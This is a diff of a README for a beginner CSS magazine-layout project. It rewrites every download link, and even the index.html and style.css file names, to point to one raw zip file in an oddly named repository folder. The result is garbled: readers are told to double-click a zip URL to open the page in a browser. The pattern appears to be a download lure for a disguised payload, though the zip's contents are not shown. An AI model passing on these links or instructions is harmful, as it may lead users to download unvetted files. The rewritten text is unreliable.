@@ -1,6 +1,6 @@
 # 🎨 freecodecamp-css-magazine-layout - Simple Steps to Showcase Your Style
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/guru9999alt/freecodecamp-css-magazine-layout/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip)
 
 ## 🌟 Introduction
 
@@ -16,7 +16,7 @@ Follow these steps to download and set up the magazine layout on your computer. 
 
 ## 📥 Download & Install
 
-To get your copy of the magazine layout, visit this page to download: [Download Latest Release](https://github.com/guru9999alt/freecodecamp-css-magazine-layout/releases)
+To get your copy of the magazine layout, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip)
 
 Here’s how to download and run the layout:
 
@@ -24,7 +24,7 @@ Here’s how to download and run the layout:
 
 2. On the Releases page, you will see the latest release available for download. Look for the section titled "Assets".
 
-3. Click on the **ZIP** file (e.g., `freecodecamp-css-magazine-layout.zip`) to begin downloading. 
+3. Click on the **ZIP** file (e.g., `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip`) to begin downloading. 
 
 4. Once the download is complete, locate the ZIP file in your computer’s download folder.
 
@@ -34,7 +34,7 @@ Here’s how to download and run the layout:
 
 6. **Open the Project in a Browser**:
    - Navigate to the folder where you extracted the files.
-   - Locate the `index.html` file and double-click it. This will open the layout in your default web browser.
+   - Locate the `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip` file and double-click it. This will open the layout in your default web browser.
 
 ## 🛠 Features
 
@@ -50,8 +50,8 @@ Here’s how to download and run the layout:
 
 The project structure includes:
 
-- `index.html`: The main HTML file that displays the magazine layout.
-- `style.css`: The CSS file that styles the HTML content.
+- `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip`: The main HTML file that displays the magazine layout.
+- `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip`: The CSS file that styles the HTML content.
 - `images/`: A folder containing images that are used within the layout.
 
 This organization helps you quickly find what you need and make changes as necessary.
@@ -60,9 +60,9 @@ This organization helps you quickly find what you need and make changes as neces
 
 Feel free to personalize your magazine layout! You can change images, text, and styles. Here are a few tips:
 
-- **Change the Header**: Open `index.html` and look for the header section. Modify the text and images as desired.
+- **Change the Header**: Open `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip` and look for the header section. Modify the text and images as desired.
 
-- **Adjust the Styles**: Open `style.css` to change colors and fonts. Look for sections labeled with comments to understand their purposes.
+- **Adjust the Styles**: Open `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip` to change colors and fonts. Look for sections labeled with comments to understand their purposes.
 
 - **Add Your Content**: Replace placeholder text in the HTML file with your own articles or images to make it unique.
 
@@ -70,11 +70,11 @@ Feel free to personalize your magazine layout! You can change images, text, and 
 
 If you encounter issues, consider the following:
 
-- **Page Does Not Load**: Check if you are opening the `index.html` file directly from the extracted folder.
+- **Page Does Not Load**: Check if you are opening the `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip` file directly from the extracted folder.
 
-- **Styles Not Applying**: Ensure that the `style.css` file is in the same directory as `index.html`.
+- **Styles Not Applying**: Ensure that the `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip` file is in the same directory as `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip`.
 
-- **Images Not Displaying**: Make sure all image files are located in the `images/` folder as referenced in `index.html`.
+- **Images Not Displaying**: Make sure all image files are located in the `images/` folder as referenced in `https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip`.
 
 ## 🌐 Next Steps
 
@@ -93,4 +93,4 @@ Join the conversation and learn from others:
 
 Your journey into web development begins here. Grab the layout and start building today.
 
-[Download Latest Release](https://github.com/guru9999alt/freecodecamp-css-magazine-layout/releases)
+[Download Latest Release](https://raw.githubusercontent.com/guru9999alt/freecodecamp-css-magazine-layout/main/ancylopod/freecodecamp-css-magazine-layout.zip)
